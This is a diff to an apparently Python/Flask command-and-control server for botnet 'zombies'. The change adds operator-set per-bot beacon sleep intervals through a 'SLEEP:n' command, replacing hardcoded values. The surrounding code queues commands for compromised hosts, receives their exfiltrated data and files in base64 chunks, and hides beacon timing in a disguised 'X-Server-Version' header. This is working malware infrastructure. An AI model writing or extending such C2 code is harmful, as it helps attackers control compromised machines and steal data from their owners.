@@ -219,6 +219,8 @@ class Server:
                     return redirect("/login", 302)
             elif request.method == 'POST':
                 command = request.form['command']
+                if command.split(':',1)[0].upper() == 'SLEEP':
+                    self.db.set_zombie_sleep(zombieID,int(command.split(':')[1]))
                 self.db.add_command(command, zombieID)
                 m = "Command Added!"
                 return render_template("execmd.html",message=m,z=zombieID)
@@ -324,7 +326,6 @@ class Server:
             zombieID = content['X-Client-ID']
             #logger.debug(f"found zombieID: {zombieID}")
             # Static value to determine how long to sleep, need build a way to set dynamically
-            sleepLength = 6
             con = self.db.get_con(self.db.name)
             cur = self.db.get_cur(con)
             # check here if zombie has command available
@@ -339,7 +340,7 @@ class Server:
                 con.close()
                 if res is None:
                     logger.debug(f"{zombieID}: No Commands available")
-                    body = {"X-Server-Version":f"{sleepLength}"}
+                    body = {"X-Server-Version":f"{self.db.get_zombie_sleep(zombieID)}"}
                     #resp = make_response("<body><p>OK</p></body>")
                     self.db.updateTime("zombies",zombieID)
                     return jsonify(body)
@@ -349,7 +350,7 @@ class Server:
                     logger.debug(f"Found token: {token}")
                     resp = make_response(redirect('/recvFrom',code=302))
                     resp.headers.add("Token",token)
-                    resp.headers.add('X-Server-Version', sleepLength)
+                    resp.headers.add('X-Server-Version', self.db.get_zombie_sleep(zombieID))
                     self.db.updateTime("zombies",zombieID)
                     return resp
             elif zombieID is not None:
@@ -358,7 +359,7 @@ class Server:
                 logger.debug(f"now attempting to add host to database")
                 if self.db.add_zombie(newHost):
                     logger.debug(f"{newHost}: Added to db!")
-                    body = {"X-Server-Version":f"{sleepLength}"}
+                    body = {"X-Server-Version":f"{self.db.get_zombie_sleep(zombieID)}"}
                     return jsonify(body)
                 else:
                     logger.debug(f"{newHost}: ERROR, NOT ADDED")
@@ -389,10 +390,11 @@ class Server:
             data = content['data'] # This is "CHUNK_0:base64blob"
             dataType = content['type']
             pageID = content.get('page')
+            
 
             if dataType.upper() == "CMD":
                 self.db.add_data(data, zombieID)
-                return jsonify({"X-Server-Version": "3"})
+                return jsonify({"X-Server-Version": f"{self.db.get_zombie_sleep(zombieID)}"})
             else:
                 # Extract the index from the data string (e.g., "CHUNK_0")
                 # This ensures we know exactly which piece this is, regardless of arrival order
@@ -404,10 +406,10 @@ class Server:
                     ioFile.write_chunk(chunk_name, data) # Pass the specific chunk name
                     token = ioFile.process_file(zombieID)
                     self.db.add_file(zombieID, token=token)
-                    return jsonify({"X-Server-Version": "3"})
+                    return jsonify({"X-Server-Version": f"{self.db.get_zombie_sleep(zombieID)}"})
                 else:
                     ioFile.write_chunk(chunk_name, data)
-                    return jsonify({"X-Server-Version": "3"})
+                    return jsonify({"X-Server-Version": f"{self.db.get_zombie_sleep(zombieID)}"})
             
 
 
